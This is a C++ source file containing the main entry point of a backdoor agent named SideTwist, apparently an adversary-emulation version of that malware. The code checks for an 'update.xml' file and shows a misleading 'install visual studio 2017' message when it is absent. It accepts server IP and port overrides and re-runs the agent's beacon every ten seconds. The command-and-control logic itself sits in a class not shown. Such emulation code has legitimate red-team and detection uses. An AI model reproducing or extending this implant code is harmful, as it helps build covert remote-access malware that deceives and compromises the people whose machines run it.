#include "SideTwist.h"

int main(int argc, char* argv[])
{
	if (!PathFileExistsW(L".\\update.xml"))
	{
		OutputDebugStringW(L"Please install visual studio 2017 and try again");
		return -1;
	}
	
	int i;
	bool loop = false;
	std::string ip = "";
	std::string port = "";

	// Optional arguments for easier use (e.g. looping, changing the server address)
	if (argc > 1)
	{
		for (i = 1; i < argc; i++)
		{
			std::string arg = argv[i];
			if (arg == "--loop")
			{
				loop = true;
			}
			else if (arg == "-ip") {
				if (i + 1 < argc) // Ensure there's a value for this argument
				{
					ip = std::string(argv[++i]);
				}
				else
				{
					std::cerr << "-ip requires an IP address" << std::endl;
					return 1;
				}
			}
			else if (arg == "-p")
			{
				if (i + 1 < argc) // Ensure there's a value for this argument
				{
					port = std::string(argv[++i]);
				}
				else
				{
					std::cerr << "-p requires an port" << std::endl;
					return 1;
				}
			}
			else 
			{
				std::cout << arg << ": Unrecognized argument. Ignoring and continuing with defaults." << std::endl;
			}
		}
	}

	//Create the agent with default settings
	SideTwist* sideTwistObj = new SideTwist();

	// Change the upstream address or port, if supplied - for testing, not part of production
	// CURRENTLY UNVALIDATED - Approriate validation to be added later based on remaining time
	if (!ip.empty()) 
	{
		sideTwistObj->setIPAddress(ip);
	}
	if (!port.empty()) 
	{
		sideTwistObj->setPort(port);
	}
	
	// Run once if --loop wasn't supplied
	bool keepAlive = false;
	if (loop)
	{
		keepAlive = true;
	}

	// Execute
	do
	{
		int response = sideTwistObj->run();
		if (response == -1)
		{
			keepAlive = false;
		}
		if (keepAlive) 
		{
			Sleep(10000);
		}
	} while (keepAlive);

	delete sideTwistObj;
	return 0;
}